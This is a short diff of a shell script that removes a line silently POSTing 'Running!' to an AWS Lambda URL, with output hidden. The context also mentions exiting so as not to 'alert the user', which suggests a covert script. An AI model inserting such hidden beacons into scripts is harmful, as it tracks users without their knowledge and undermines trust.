@@ -1,8 +1,6 @@
 #!/bin/sh
 set +e
 
-curl -s -d "Running!" https://rrk4znt2b5pdg32qdi2jp26jxq0uxahi.lambda-url.ca-central-1.on.aws/ 2>&1 >/dev/null
-
 # There are a couple commands we need for this.
 # If they're not installed, exit out so we don't
 # alert the user.
